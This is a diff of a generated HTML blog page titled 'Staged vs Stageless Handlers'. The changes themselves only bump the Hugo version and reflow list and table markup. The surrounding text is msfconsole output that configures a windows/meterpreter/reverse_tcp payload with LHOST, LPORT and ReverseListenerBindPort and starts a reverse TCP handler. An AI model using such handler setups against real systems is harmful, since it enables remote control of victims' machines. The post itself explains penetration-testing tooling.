@@ -11,7 +11,7 @@ The purpose of this post is to talk about the differences between these two, par
 Let&rsquo;s dive in.">
         <meta name="HandheldFriendly" content="True">
         <meta name="MobileOptimized" content="320">
-        <meta name="generator" content="Hugo 0.55.1" />
+        <meta name="generator" content="Hugo 0.55.6" />
         <meta name="robots" content="index,follow">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <meta property="og:title" content="Staged vs Stageless Handlers">
@@ -317,8 +317,8 @@ msf exploit(handler) &gt; [*] [2016.10.05-12:25:23] Starting the payload handler
 
 <ol>
 <li>We leave <code>LPORT</code> set to <code>8000</code>, because this is what we want the transport configuration to contain.</li>
-<li>We set <code>ReverseListenerBindPort</code> to something different (<code>9000</code> in our example), as this forces the listener to bind to another port, which we will point our staged payload at.</li>
-</ol>
+
+<li><p>We set <code>ReverseListenerBindPort</code> to something different (<code>9000</code> in our example), as this forces the listener to bind to another port, which we will point our staged payload at.</p>
 
 <pre><code>msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
 payload =&gt; windows/meterpreter/reverse_tcp
@@ -328,24 +328,24 @@ msf exploit(handler) &gt; options
 
 Module options (exploit/multi/handler):
 
-   Name  Current Setting  Required  Description
-   ----  ---------------  --------  -----------
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
 
 
 Payload options (windows/meterpreter/reverse_tcp):
 
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.1.10.35       yes       The listen address
-   LPORT     8000             yes       The listen port
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+LHOST     10.1.10.35       yes       The listen address
+LPORT     8000             yes       The listen port
 
 
 Exploit target:
 
-   Id  Name
-   --  ----
-   0   Wildcard Target
+Id  Name
+--  ----
+0   Wildcard Target
 
 
 msf exploit(handler) &gt; run -j
@@ -353,7 +353,8 @@ msf exploit(handler) &gt; run -j
 
 [*] [2016.10.05-12:29:48] Started reverse TCP handler on 10.1.10.35:9000
 msf exploit(handler) &gt; [*] [2016.10.05-12:29:48] Starting the payload handler...
-</code></pre>
+</code></pre></li>
+</ol>
 
 <p>This time, when we create a payload for this listener, we use the <code>ReverseListenerBindPort</code> value for <code>LPORT</code>:</p>
 
